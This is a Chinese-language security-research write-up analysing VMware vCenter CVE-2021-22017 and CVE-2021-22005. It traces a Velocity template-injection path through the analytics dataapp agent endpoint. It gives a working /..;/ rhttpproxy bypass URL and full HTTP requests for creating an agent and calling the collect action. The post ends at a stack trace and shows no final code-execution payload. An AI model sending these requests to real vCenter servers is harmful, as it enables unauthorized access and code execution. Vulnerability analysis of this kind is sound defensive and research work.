Author: lz520520@深蓝攻防实验室
# CVE-2021-22017+22005模板注入分析
之前分析了22005，在ceip开启情况下通过log4j写文件的利用，其实除了该漏洞点，22005还有一个collect接口的利用，通过Velocity模板注入来执行代码，但该接口可能无法访问，所以需要结合22017的rhttpproxy
绕过漏洞。  
这个低版本没有 vCenter Appliance 6.7d (6.7.0.14000)  
可以更新到vCenter Appliance 6.7 Update 3k (6.7.0.45100)
## 漏洞分析
com.vmware.ph.phservice.cloud.dataapp.server.DataAppAgentController
### collect接口请求格式
对比补丁发现发现`/analytics/ph/api/dataapp/agent?action=collect`接口被删除了，所以该接口很可能就是漏洞点，进一步跟进分析。  
这个接口有些老版本是可以直接访问的，但2021年的版本做了控制，导致不是所有版本都能访问。  
所以需要绕过访问，在这次更新的补丁里有一个rhttpproxy绕过，通过/..;/可绕过，如下URL
    /analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent
17958471以上接口访问有问题，其他待测试。  
根据接口参数要求，必须的参数是`_c`、`_i`、头部字段`X-Deployment-Secret`、以及body，body使用@RequestBody注解就表示是一个json数据，也就是`Content-Type:
application/json`  
这里body参数collectRequestSpecJson会通过DataAppAgentRequestDeserializer.deserializeCollectRequestSpec方法进行反序列化转换成CollectRequestSpec对象，里面调用jackson做的反序列化。  
看下这个json数据需要哪几个参数，如下所示，有三个参数，格式可得
    {"manifestContent": "a1", "contextData": "a2", "objectId": "a3"}
构造数据包发送测试
    POST /analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?action=collect&_c=vSphere.vapi.6_7&_i=9D36C850-1612-4EC4-B8DD-50BA239A25BB  HTTP/1.1
    Host: 192.168.111.11
    Connection: close
    Accept-Encoding: gzip, deflate
    Accept: */*
    User-Agent: Mozilla/5.0
    Upgrade-Insecure-Requests: 1
    Content-Type: application/json
    X-Deployment-Secret: test
    Content-Length: 64
    {"manifestContent": "a1", "contextData": "a2", "objectId": "a3"}
测试返回404以及错误信息，报错信息就是这部分抛出，调试下  
测试发现getAgent报错，agentId是通过四个参数生成，这四个参数相同才是同一个agentId。
    collectorId, collectorInstanceId, deploymentSecret, pluginType
观察this._dataAppAgentService实际是DefaultDataAppAgentManager，在这个类看到除了getAgent，还有createAgent，这里先不细究agent创建和获取的过程，但目前看起来，要调用getAgent，需要先createAgent存储一个agent。  
### agent创建和获取逻辑
emmm，回头看不细究不行了，getAgent要不报错，需要以下两处都不为null
    this._agentRepository.get
    this.getActiveAgent
首先
    this._agentRepository.get
如下会读取一个文件，如果存在就返回。  
/etc/vmware-analytics/agents/vSphere.vapi.6_7.properties  
文件名通过getFileName方法生成，通过collectorId和pluginType组成，后缀是固定为.properties，那么可想而知createAgent里肯定有一个创建文件的地方。  
先看看createAgent，使用同样的this._agentRepository.get获取，文件名有就抛出异常，如果没获取到就add添加  
那么添加其实就是一样的格式去创建这个文件。  
文件内容  
回过头再看看this.getActiveAgent，是通过agentId的equals方法来判断  
和之前判断是一样的，需要四个参数相等才一样。  
整理下agentId对象获取的逻辑
  1. 判断配置文件是否存在`/etc/vmware-analytics/agents/[agentId.getCollectorId() + pluginType + ".properties"]`
  2. 存在后判断List _activeAgents 里是否有agentId，根据他的四个属性相同判断
所以在测试时，如果要根据新的agentId来测试，那么createAgent时，CollectorId或pluginType要不同，否则无法创建一个新的agentId，如果这两个参数不变，仅修改其他两个参数，是创建不成功的，就会导致获取失败。
### createAgent请求格式
那么就找下是否有调用createAgent的位置，如下，然后构造一个请求包，这个接口和上面不同之处没有action参数  
大概格式是，body部分是createSpecJson，会反序列化成DataAppAgentCreateSpec对象，该对象也是createAgent的一个参数。
    POST /analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?_c=vSphere.vapi.6_7&_i=9D36C850-1612-4EC4-B8DD-50BA239A25BB HTTP/1.1
    Content-Type: application/json
    X-Deployment-Secret: test
    Content-Length: 250
    {}
这个对象里是有如下属性，emmm，但需不需要这些参数，还是提交一个空的json就行，还不知道，先传入测试。
    {"manifestSpec": {"resourceId": "b1", "dataType": "b2", "objectId": "b3", "versionDataType": "b4", "versionObjectId": "b5"}, "objectType": "a1", "collectionTriggerDataNeeded": true, "deploymentDataNeeded": true, "resultNeeded": true, "signalCollectionCompleted": true, "localManifestPath": "a2", "localPayloadPath": "a3", "localObfuscationMapPath": "a4"}
最终请求包
    POST /analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?_c=vSphere.vapi.6_7&_i=9D36C850-1612-4EC4-B8DD-50BA239A25BB HTTP/1.1
    Host: 192.168.111.11
    Connection: close
    Accept-Encoding: gzip, deflate
    Accept: */*
    User-Agent: Mozilla/5.0
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    Content-Type: application/json
    X-Deployment-Secret: secret
    X-Plugin-Type: test
    Content-Length: 354
    {"manifestSpec": {"resourceId": "b1", "dataType": "b2", "objectId": "b3", "versionDataType": "b4", "versionObjectId": "b5"}, "objectType": "a1", "collectionTriggerDataNeeded": true, "deploymentDataNeeded": true, "resultNeeded": true, "signalCollectionCompleted": true, "localManifestPath": "a2", "localPayloadPath": "a3", "localObfuscationMapPath": "a4"}
通过修改X-Plugin-Type即可创建新的agentId  
创建后就可正常获取了，继续跟进。  
### velocity执行流程
createAgent后，再调用collect接口解析manifest，如下是一个manifestContent测试内容，mappingCode内容对应的Velocity模板，所以最终是一个Velocity模板注入。
                ServiceInstance
                content.about.instanceUuid
                content.about.osType
                content.about.build
                content.about.version
                   vir:VCenter
                            ServiceInstance
                vir:VCenter
com.vmware.ph.phservice.collector.internal.cdf.mapping.ResourceItemToJsonLdMapping#map  
跟中到如下位置，解析manifest获取mappingCode，调用VelocityHelper.executeVelocityExpression执行velocity表达式  
堆栈太长，完整的如下
    executeVelocityExpression:184, VelocityHelper (com.vmware.ph.phservice.collector.internal.cdf.mapping.velocity)
    map:92, ResourceItemToJsonLdMapping (com.vmware.ph.phservice.collector.internal.cdf.mapping)
    map:30, ResourceItemToJsonLdMapping (com.vmware.ph.phservice.collector.internal.cdf.mapping)
    map:24, SafeMappingWrapper (com.vmware.ph.phservice.collector.internal.cdf.mapping)